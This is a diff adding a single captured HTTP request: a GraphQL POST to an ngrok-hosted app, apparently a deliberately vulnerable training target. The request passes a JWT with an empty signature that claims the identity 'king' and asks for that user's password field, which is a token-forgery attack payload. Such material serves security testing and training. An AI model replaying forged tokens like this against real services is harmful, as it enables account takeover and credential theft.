@@ -1,0 +1,18 @@
+POST /graphql HTTP/2
+Host: 224d-X.ngrok-free.app
+Cookie: abuse_interstitial=224d-X.ngrok-free.app; env=graphiql:disable
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:154.0) Gecko/20100101 Firefox/154.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Referer: https://224d-X.ngrok-free.app/upload_paste
+Content-Type: application/json
+Content-Length: 349
+Origin: https://224d-X.ngrok-free.app
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=4
+Te: trailers
+
+{"query":"query me {\n    me(token: \"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzIiwiaWF0IjoxNzg4MTE3OTk5LCJuYmYiOjE3ODgxMTc5OTksImp0aSI6Ijg2YzZkY2E4LWE5MmItNGE2MS05ZjUwLTE3NzE1MmRiMTFiNyIsImlkZW50aXR5Ijoia2luZyIsImV4cCI6MTc4ODEyNTE5OX0.\") {\n        id\n        password\n        username(capitalize: true)\n    }\n}","variables":{}}
